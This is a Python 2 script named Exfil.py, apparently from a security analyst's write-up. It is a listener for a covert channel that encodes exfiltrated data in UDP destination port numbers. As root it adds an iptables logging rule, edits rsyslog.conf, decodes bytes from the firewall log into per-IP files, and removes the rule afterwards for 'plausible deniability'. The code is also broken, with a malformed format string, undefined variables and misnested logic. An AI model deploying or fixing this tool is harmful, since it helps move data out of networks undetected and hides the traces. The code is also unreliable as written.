#!/usr/bin/python
# 3.2.  Exfil.py 
#Matt Lichtenberger 
#Security Operations Center Analyst 
#UPS Inc. 
#mlichtenberger@ups.com 

import re 
import time 
import subprocess 
import select 
import sys 
import base64 
import argparse 
import os 
#This function continuously watches the end of the log file.  
#It allows us to parse out the relevant fields from the  
#firewall alerts. 
def tail(f): 
    f.seek(0, 2) 
    while True: 
        line = f.readline() 
        if not line: 
            time.sleep(0.01) 
            continue 
        yield line 
 
parser = argparse.ArgumentParser(description='Exfiltrate data listener for clients to bounce packets off of.')
parser.add_argument(
                    '-e', 
                    dest='encoding',
                    help='Encoding scheme', 
                    choices=['null', 'b16', 'b32', 'b64'], 
                    required=True
                    )
parser.add_argument(
                    '-f',
                    dest='firewall',
                    help='Set up iptables port range',
                    action='store_true'
                    )
parser.add_argument(
                   '-l',
                   dest='log',
                   help='Path to firewall log file',
                   required=True
                   )
parser.add_argument(
                   '-o',
                   dest='offset',
                   type=int,
                   help='Offset to shift port numbers by', 
                   required=True
                   )
parser.add_argument(
                   '-t',
                   dest='term_sig',
                   type=int,
                   help='DEC character that terminates conversation',
                   required=True
                   )  
parser.add_argument(
                   '-v',
                   dest='verbose',
                   help='Verbose output',
                   action='count'
                   )

args = parser.parse_args() 
offset = args.offset
term_sig = args.term_sig
verbose = 0
very_verbose = 0  

if(args.verbose == 1):
    verbose = 1
elif(args.verbose ==2 ):
    very_verbose = 1
else: 
    pass 

encoding = args.encoding 
log_path = args.log
#Do Firewall Port calculations here. Either the user has asked us
#to set it up for them or we need to advise them which ports to log on. 
start_port = 48 #ASCII 0
end_port = 0

if(encoding == 'null'):
    end_port = 122 #ASCII z
elif(encoding == 'b16'):
    end_port = 70 #ASCII F
elif(encoding == 'b32'):
    end_port = 90 #ASCII Z
elif(encoding == 'b64'):
    end_port = 122 #ascii z
else:
    pass #Uhhhh 

start_port += offset 
end_port += offset 
stop_port = term_sig + offset
portrange = str(start_port) + ':' + str(end_port) + ',' + str(stop_port)

#User has requested we set up iptables and rsyslog
if(args.firewall): 
    if not os.geteuid() == 0:
        print 'Need to be root for iptables modification.'
        sys.exit(2)
    opts = {'iptables': '/usr/sbin/iptables', 'protocol': 'udp', 'match': 'multiport', 'dports': portrange, 'log-level': 4}
    ipcmd = '{iptables} -I INPUT 1 -p {protocol} --match {match} --dport {dports} -j LOG --log-level {log[level}'.format(**opts)
    ipremove = '{iptables} -D INPUT -p {protocol} --match {match} --dport  {dports} -j LOG --log-level {log[level}'.format(**opts) 
    
    if(very_verbose):
        print ipcmd

    iptables = subprocess.call(ipcmd, shell=True)   
    rsys = open('/etc/rsyslog.conf', 'a+')
    exist = 0

    for line in rsys:
        if(line == 'kern.warning ' + log_path): 
            if(very_verbose):
                print 'Custom logging rule already exists in rsyslog.conf'
            exist = 1

    if(exist == 0):
        if(verbose):
            print 'Custom logging rule does not exist in rsyslog.conf. Adding  it.' 
        
        rsys.write('kern.warning ' + log_path) 
        rsys.close()
        subprocess.call('systemctl restart rsyslog.service', shell=True)
    else: #Help the user out a little bit
        print 'You will need to set up logging on the following ports in your firewall: ' + portrange
        print 'Additionally, you will need to set up your logging service to log to the proper log with something like kern.warning ' + log_path
        print 'Dont forget to restart your logging service.' 
 
while True: 
    try:
        print 'Logging incoming packets. Hit ctrl-c to finish and clean up.'
        data = tail(open(log_path))

        for line in data:
            #Look for the  source IP
            source =  re.search('(?:SRC=)(\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3})', line).group(1) 
            output = open(source + '.txt', 'a+') #Write out a file for each IP that  hits the
            serverbyte = chr(int(re.search('(?:DPT=)(\d{2,3})', line).group(1)) - offset)
            #Look for the port # 
            decodeLin = list()

            if(very_verbose):
                print 'Byte received: ' + byte
                if(byte == chr(term_sig)):
                    decode = output.readline()
                    if(encoding == 'null'):
                        orig = decode
                        pass #Uhhhh
                    if(verbose):
                        print 'Message received from ' + source
                        convert.close() 
                    else:
                        output.write(chr(int(re.search('(?:DPT=)(\d{2,3})', line).group(1)) - offset))
                        output.close() 
    except (KeyboardInterrupt, SystemExit): #Watch for ctrl-c
        if(args.firewall):
            if(very_verbose): 
                print ipremove
                iptables = subprocess.call(ipremove, shell=True)
                #Clean up our IPTables rule as a measure of plausible deniability 
                sys.exit() 


